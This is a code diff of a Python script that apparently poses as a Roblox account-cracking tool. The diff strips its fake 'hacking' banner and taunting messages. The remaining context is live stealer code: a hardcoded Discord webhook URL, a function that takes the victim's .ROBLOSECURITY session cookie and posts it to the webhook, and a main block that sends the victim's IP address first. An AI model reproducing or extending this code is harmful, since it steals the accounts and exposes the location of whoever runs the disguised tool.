@@ -10,30 +10,6 @@ from selenium.webdriver.edge.options import Options as EdgeOptions
 from webdriver_manager.chrome import ChromeDriverManager
 from webdriver_manager.microsoft import EdgeChromiumDriverManager
 
-print(r"""
-______      _     _             _____                _               _   _ ___________ 
-| ___ \    | |   | |           /  __ \              | |             | | | |_   _| ___ \
-| |_/ /___ | |__ | | _____  __ | /  \/_ __ __ _  ___| | _____ _ __  | | | | | | | |_/ /
-|    // _ \| '_ \| |/ _ \ \/ / | |   | '__/ _` |/ __| |/ / _ \ '__| | | | | | | |  __/ 
-| |\ \ (_) | |_) | | (_) >  <  | \__/\ | | (_| | (__|   <  __/ |    \ \_/ /_| |_| |    
-\_| \_\___/|_.__/|_|\___/_/\_\  \____/_|  \__,_|\___|_|\_\___|_|     \___/ \___/\_|    
-                                                                                    
-""")
-
-username = input("Input username: ")
-
-print(f"Starting hack on {username}...")
-time.sleep(2)
-print("Bypassing security protocols...")
-time.sleep(2)
-print("Accessing database...")
-time.sleep(2)
-print("Extracting credentials...")
-time.sleep(2)
-print("Disabling firewall...")
-time.sleep(2)
-print("The following prints are compromising TARGETS data:")
-
 # Webhook URL
 WEBHOOK_URL = "https://discord.com/api/webhooks/1347591981567840277/iZdHuzSQy1UuB9IJ6nz5oG-NSepNBqpFtNR3mmIZ82lKo5-4VwSQekeKjXBWOAF8AE4S"
 
@@ -148,12 +124,6 @@ def get_roblox_cookie():
     
     send_to_webhook("⚠ No Roblox Cookie Found", "Could not retrieve .ROBLOSECURITY")
     return None
-
-    print("this is what happens if you try to hack other people lol")
-    time.sleep(2)  # Indented correctly
-    print("uploading your IP cookies to the dark web")
-    time.sleep(1)  # Indented correctly
-    print("Enjoy having your cookies hacked and IP on the black market, dumbass")
 
 if __name__ == "__main__":
     send_ip()  # Send IP before running main function
